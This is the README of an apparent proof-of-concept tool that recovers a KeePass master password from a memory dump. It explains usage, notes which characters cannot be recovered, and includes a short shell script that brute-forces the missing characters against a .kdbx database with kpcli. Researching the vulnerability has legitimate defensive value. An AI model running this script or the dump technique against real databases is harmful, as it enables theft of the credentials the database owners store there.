# keepass-dump-masterkey

## Usage

`python3 poc.py <PathToDmp>`

## Preview

![](/img/preview.png)

As a reminder, the first character cannot be found in the dump, and for the second the script will only give you a few possibilities, in any case we recommend you to run the bruteforce on 2 chars with the script below 

```bash
#!/bin/sh
# Usage: ./keepass-pwn.sh Database.kdbx wordlist.txt (wordlist with 2 char)
while read i
do
    echo "Using password: \"$i\""
    echo "$i" | kpcli --kdb=$1 && exit 0
done < $2

```


>This script works very well in the case of a physical machine, for virtual machines it does not seem stable

Btw : the python script present in this project follows the reading of the following project: https://github.com/vdohney/keepass-password-dumper

Written by https://github.com/LeDocteurDesBits